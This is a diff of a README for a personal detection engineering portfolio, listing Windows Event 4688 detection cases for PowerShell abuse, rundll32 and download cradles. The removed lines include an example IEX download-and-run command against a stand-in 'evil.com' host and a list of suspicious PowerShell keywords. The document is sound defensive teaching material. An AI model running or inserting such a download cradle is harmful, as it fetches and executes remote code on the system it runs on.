@@ -1,67 +1,143 @@
-# Detection Engineering Lab
+# SOC Detection Engineering Lab
 
-This repository contains hands-on SOC detection engineering labs focused on detecting attacker techniques using Windows logs and Sysmon.
+This repository contains a collection of hands-on detection engineering labs designed to simulate common attacker techniques and analyze them using Windows Security Logs.
 
-The goal of this project is to simulate real-world attack techniques and build detection logic used by SOC analysts and Detection Engineers.
+The purpose of this project is to practice **SOC analysis, threat detection, and incident investigation** using realistic attack simulations.
 
-## Lab Environment
+The labs focus on detecting malicious activity using:
 
-- Windows 11 Target Machine
-- Kali Linux Attacker Machine
-- Sysmon Logging
 - Windows Event Logs
-- Sigma Detection Rules
+- PowerShell behavior
+- Command line analysis
+- LOLBins abuse
+- Fileless malware techniques
 
-## Detection Use Cases
+---
 
-### Case 1 – Suspicious PowerShell Execution
+# Lab Environment
 
-This detection identifies suspicious PowerShell commands that may indicate malicious activity.
+Attacker Machine
 
-**Log Source**
+```
+Kali Linux
+```
 
+Target Machine
+
+```
+Windows 10
+```
+
+Logs monitored
+
+```
 Windows Security Log
+Event ID 4688
+```
 
-**Event ID**
+---
 
-4688 – Process Creation
+# Detection Use Cases
 
-**Detection Logic**
+| Case | Technique | Detection Focus |
+|-----|-----|-----|
+| Use Case | Description | MITRE Technique |
+|----------|-------------|----------------|
+| [Case1 – PowerShell Detection](Case1_powershell_detection) | Detect basic PowerShell execution using Windows Event ID 4688 | T1059.001 |
+| [Case2 – Encoded PowerShell](Case2_Encoded_PowerShell) | Detect PowerShell commands executed with Base64 encoded payloads | T1059.001 |
+| [Case3 – Suspicious Parent Process](Case3_Suspicious_Parent_Process) | Detect suspicious parent-child process relationships | T1059 |
+| [Case4 – PowerShell Spawning Rundll32](Case4_PowerShell_Rundll32) | Detect LOLBin abuse where PowerShell launches rundll32 | T1218 |
+| [Case5 – Encoded Hidden PowerShell](Case5_Encoded_Hidden_PowerShell) | Detect hidden PowerShell execution using encoded commands | T1059.001 |
+| [Case6 – PowerShell Download Payload](Case6_PowerShell_Download_Payload) | HTTP Payload Retrieval | T1105 |
+| [Case7 - PowerShell Download Cradle] (Case7_PowerShell_IEX_Download) | IEX + Net.WebClient | T1059 |
+| [Case8 - Encoded PowerShell Download] (Case8_Encoded_PowerShell_Download) | Obfuscated Execution | T1027 |
 
-Alert when PowerShell is executed with suspicious parameters such as:
+---
 
-- -nop
-- -enc
-- downloadstring
-- IEX
+# Detection Techniques Practiced
 
-Example attack:
+This project covers several important blue team detection skills:
 
-powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')"
+- PowerShell abuse detection
+- Encoded command detection
+- Command-line threat hunting
+- Fileless malware detection
+- Suspicious process creation
+- Remote payload retrieval
 
-**MITRE ATT&CK**
+These techniques are commonly used by:
 
-T1059.001 – PowerShell
+- Red Team tools
+- Malware loaders
+- Cobalt Strike
+- Fileless attacks
 
-## SOC Investigation Steps
+---
 
-- Investigate the process tree
-- Identify the parent process
-- Check network connections
-- Determine if the activity is malicious
-- Isolate the host if required
+# Log Analysis
 
-# Detection Engineering Lab
+Most detections rely on analyzing:
 
-This repository contains practical detection engineering use cases based on Windows security logs and MITRE ATT&CK techniques.
+```
+Event ID 4688
+```
 
-## Detection Use Cases
+Important fields:
 
-| Use Case | Description | Technique |
-|--------|-------------|-----------|
-| [Case1](Case1_powershell_detection) | Detect PowerShell execution | T1059.001 |
-| [Case2](Case2_Encoded_PowerShell) | Detect encoded PowerShell commands | T1059.001 |
-| [Case3](Case3_Suspicious_Parent_Process) | Detect suspicious parent-child processes | T1059 |
-| [Case4](Case4_PowerShell_Rundll32) | Detect rundll32 LOLBin abuse | T1218 |
-| [Case5](Case5_Encoded_Hidden_PowerShell) | Detect hidden encoded PowerShell execution | T1059.001 |
-| [Case6](Case6%20%E2%80%93%20PowerShell%20Download%20Payload) | Detect PowerShell downloading files from the internet | T1105 |
+```
+NewProcessName
+CommandLine
+ParentProcessName
+```
+
+These logs help SOC analysts identify suspicious execution patterns.
+
+---
+
+# Sigma Detection Rules
+
+Each case includes a **Sigma rule** to demonstrate how detection logic can be implemented for SIEM systems.
+
+Sigma rules help translate detection logic into multiple SIEM platforms.
+
+---
+
+# Project Structure
+
+```
+SOC-Detection-Lab
+│
+├── Case-1-PowerShell-Execution
+├── Case-2-Encoded-PowerShell
+├── Case-3-Suspicious-Parent
+├── Case-4-Rundll32-Abuse
+├── Case-5-Hidden-PowerShell
+├── Case-6-PowerShell-Download
+├── Case-7-IEX-Download-Cradle
+└── Case-8-Encoded-PowerShell-Download
+```
+
+Each case contains:
+
+```
+README.md
+Sigma Rule
+Screenshots
+```
+
+---
+
+# Author
+
+Wael Saad Kamal  
+Detection Engineer | Network & Security Engineer  
+
+Email: waelsk95@gmail.com
+
+---
+
+# Goal of This Project
+
+The goal of this project is to build a **Detection Engineering portfolio** demonstrating practical SOC investigation and threat detection skills.
+
+This lab environment helps simulate attacker behavior and improve blue team analysis capabilities.
